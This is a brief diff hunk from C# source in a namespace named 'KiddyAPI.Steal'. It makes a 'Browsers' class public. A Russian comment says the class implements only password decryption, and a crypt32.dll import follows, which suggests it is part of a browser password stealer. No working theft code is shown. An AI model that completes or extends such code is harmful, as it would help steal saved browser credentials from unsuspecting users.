@@ -10,7 +10,7 @@ namespace KiddyAPI.Steal
     /// <summary>
     /// В классе реализована только расшифровка паролей
     /// </summary>
-    class Browsers
+    public class Browsers
     {
         [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 
